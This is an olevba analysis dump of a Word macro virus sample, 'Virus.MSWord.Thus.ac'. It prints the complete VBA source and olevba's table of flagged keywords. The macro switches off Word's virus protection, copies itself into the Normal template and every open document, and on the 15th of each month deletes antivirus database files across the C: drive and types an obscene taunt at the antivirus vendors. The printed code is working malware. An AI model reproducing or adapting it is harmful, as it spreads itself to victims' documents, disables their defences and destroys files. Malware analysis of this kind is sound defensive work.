olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.ac-769750bb85401ceee4a6d8769552014a21c4efbb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.ac-769750bb85401ceee4a6d8769552014a21c4efbb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Anti AVP&DrWEB 2.0'
'Лицензионное соглашение:
'   Данный вирус распространяется бесплатно
'   по схеме AS IS (как есть).
'   Никаких ограничений на распространение, тиражирование,
'   копирование и получение прибыли не существует.
'   Для его отслеживания и лечения вам необходимо обратиться:
'   в антивирусную лабораторию И. Данилова ("Диалог - Наука")
'
'   Адрес: 117786, Москва, ул. Вавилова 40, офис 102.
'   Проезд: ст. метро "Ленинский проспект" (выход к ул. Орджоникидзе), далее любым трамваем до остановки "Улица Губкина" (4-я остановка в сторону ст. метро "Университет").
'   Просьба обращаться с 10 до 18 часов по рабочим дням.
'   Тел.: (095) 135-6253, 137-0150
'   Тел./факс: (095) 938-2970
'   BBS (круглосуточные линии):
'
'   (095) 938-2856 (28800/V.34) - линия общего доступа;
'   (095) 938-2867 (28800/V.34, 33600/V.34+) – подписчики;
'   (095) 938-2969 (28800/V.34, 33600/V.34+) – подписчики;
'   (095) 939-3705 (28800/V.34, 33600/V.34+) – подписчики;
'   (095) 939-5239 (28800/V.34, 33600/V.34+) – подписчики.
'
'   FidoNet: 2:5020/69
'   E-mail: Antivir@DialogNauka.ru - замечания, пожелания, поставки, обслуживание, передача новых вирусов
'   Сервер WWW: http://www.DialogNauka.ru
'
'   Серверы FTP: ftp://ftp.DialoNauka.ru,   ftp://ftp2.DialogNauka.ru,   
'   ftp://ftp3.DialogNauka.ru
'
    Dim K As Long
    Dim C As Long
    Dim S As String
    Dim f As Boolean
    On Error Resume Next
    Application.Options.VirusProtection = False
    f = Application.Options.SaveNormalPrompt
    Application.Options.SaveNormalPrompt = False
    If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1) <> "'Anti AVP&DrWEB 2.0'" Then
        C = Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        S = Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, C)
        K = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, K
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, S
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    Application.Options.SaveNormalPrompt = f
    For K = 1 To Application.Documents.Count
        If Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.Lines(2, 1) <> "'Anti AVP&DrWEB 2.0'" Then
            C = Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.CountOfLines
            Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.DeleteLines 1, C
            C = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            S = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, C)
            Application.Documents.Item(K).VBProject.VBComponents(1).CodeModule.InsertLines 1, S
        End If
    Next K
    'Середина месяца
    If Day(Now()) = 15 Then
        With Application.FileSearch
            .NewSearch
            .MatchTextExactly = False
            .LookIn = "C:\"
            .SearchSubFolders = True
            .FileName = "*.vdb"
            .FileType = msoFileTypeAllFiles
            If .Execute > 0 Then
                For K = 1 To .FoundFiles.Count
                    S = .FoundFiles(K)
                    Kill S
                Next K
            End If
        End With
        With Application.FileSearch
            .NewSearch
            .MatchTextExactly = False
            .LookIn = "C:\"
            .SearchSubFolders = True
            .FileName = "*.avc"
            .FileType = msoFileTypeAllFiles
            If .Execute > 0 Then
                For K = 1 To .FoundFiles.Count
                    S = .FoundFiles(K)
                    Kill S
                Next K
            End If
        End With
        With Selection
            .Font.Size = 36
            .Font.ColorIndex = wdRed
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .TypeText "I Fuck AVP & DrWeb!!!"
            .TypeParagraph
            .Font.Size = 12
            .Font.ColorIndex = wdBlack
            .TypeText "Для того, чтобы полностью защитить себя от вирусов - необходимо ваш компьютер залить бетоном, заварить арматурой, сверху натянуть презерватив и ни каких половых связей с дискетами !!!. А это - всего лишь еще одна головная боль для Игоря Данилова (Игорь, Sorry, но мне так хотелось, чтобы ты меня заметил и включил в свои мемуары в виде вирусных баз.) А вообще, если честно, DrWeb - один из лучших антивирусов в России (жаль только распространяется платно). Ну вот, наверно и все... Будет скучно - шлите деньги :-)"
            .TypeParagraph
        End With
    End If
End Sub

Private Sub Document_Close()
    Document_Open
End Sub

Private Sub Document_New()
   Document_Open
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.DialogNau|URL                                          |
|          |ka.ru               |                                             |
|IOC       |ftp://ftp.DialoNauka|URL                                          |
|          |.ru                 |                                             |
|IOC       |ftp://ftp2.DialogNau|URL                                          |
|          |ka.ru               |                                             |
|IOC       |ftp://ftp3.DialogNau|URL                                          |
|          |ka.ru               |                                             |
+----------+--------------------+---------------------------------------------+

